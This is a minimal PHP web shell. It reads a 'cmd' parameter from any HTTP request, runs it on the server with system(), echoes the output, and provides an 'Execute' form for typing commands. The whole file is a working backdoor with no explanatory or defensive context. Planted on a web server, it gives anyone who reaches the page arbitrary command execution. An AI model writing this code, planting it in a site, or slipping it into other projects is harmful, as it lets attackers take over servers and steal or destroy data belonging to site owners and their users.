<?php 
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="POST">
<input type="text" name="cmd" />
<input type="submit" value="Execute" />
</form>